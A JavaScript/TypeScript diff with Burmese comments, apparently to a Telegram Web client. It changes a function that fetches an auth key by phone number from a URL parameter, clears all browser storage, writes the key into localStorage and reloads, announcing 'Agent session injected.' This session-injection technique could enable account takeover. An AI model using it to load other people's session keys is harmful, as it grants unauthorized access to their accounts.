@@ -46,6 +46,7 @@ async function checkAndInjectSession() {
   let loginPhone = urlParams.get('login_phone');
 
   if (loginPhone) {
+    // '+' သင်္ကေတ လွဲချော်မှုမရှိစေရန် ပြန်လည်ပြင်ဆင်ခြင်း
     loginPhone = loginPhone.replace(/ /g, '+');
     if (!loginPhone.startsWith('+')) {
       loginPhone = '+' + loginPhone;
@@ -71,42 +72,18 @@ async function checkAndInjectSession() {
         
         const authKeyArray = hexToArray(data.authKeyHex);
         
-        // 🌟 ပြင်ဆင်ချက် (၁): Storage တစ်ခုလုံးကို မဖျက်ပါ 🌟
-        // ယခင် Auth Key အဟောင်းများကိုသာ ရွေးဖျက်ပါမည်
-        for (let i = 1; i <= 5; i++) {
-            localStorage.removeItem(`dc${i}_auth_key`);
-        }
+        // 🌟 ပြင်ဆင်ချက်: Storage အဟောင်းများကို ရှင်းမည်။ 🌟
+        // သို့သော် tt-global-state ကို ကိုယ်တိုင် ဝင်မရေးတော့ပါ။ App ကိုယ်တိုင် တည်ဆောက်ခွင့်ပေးပါမည်။
+        localStorage.clear();
+        sessionStorage.clear();
         
+        // Auth Key များကိုသာ မှန်ကန်စွာ ထည့်သွင်းပါမည်
         localStorage.setItem('dc', String(data.dcId));
         localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
         
-        // 🌟 ပြင်ဆင်ချက် (၂): Global State ကို အကုန်မဖျက်ဘဲ Auth ကိုသာ Update လုပ်ခြင်း 🌟
-        let globalState: any = { settings: { byKey: {} }, auth: {} };
-        try {
-            const stored = localStorage.getItem('tt-global-state');
-            if (stored) {
-                // ရှိပြီးသား Settings များကို ပြန်ယူပါမည်
-                globalState = { ...globalState, ...JSON.parse(stored) };
-            }
-        } catch (e) {
-            console.error("State parse error", e);
-        }
-        
-        // Auth State ကိုသာ Ready ဖြစ်ကြောင်း သတ်မှတ်သည်
-        globalState.auth = {
-            ...globalState.auth,
-            state: "authorizationStateReady"
-        };
-        
-        // Settings မရှိပါက Error မတက်စေရန် Default ထည့်ပေးခြင်း
-        if (!globalState.settings) globalState.settings = { byKey: {} };
-        if (!globalState.settings.byKey) globalState.settings.byKey = { language: "en", theme: "dark", messageTextSize: 16 };
-
-        // State အသစ်ကို ပြန်သိမ်းသည်
-        localStorage.setItem('tt-global-state', JSON.stringify(globalState));
-        
         alert("Mission Synchronized! Agent session injected.");
         
+        // URL ထဲမှ Parameter ကို ဖျောက်ပြီး Reload လုပ်ပါမည်
         window.history.replaceState({}, document.title, window.location.pathname);
         window.location.reload(); 
         return; 
